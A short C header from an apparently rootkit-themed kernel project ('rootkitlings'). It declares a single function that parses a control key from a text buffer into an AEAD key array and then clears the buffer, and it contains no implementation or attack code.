/* SPDX-License-Identifier: GPL-2.0 */
#ifndef ROOTKITLINGS_PROVISION_H
#define ROOTKITLINGS_PROVISION_H

#include "aead.h"

int rk_control_key_parse_and_clear(
	char *text, size_t capacity, u8 key[RK_AEAD_KEY_LENGTH]);

#endif
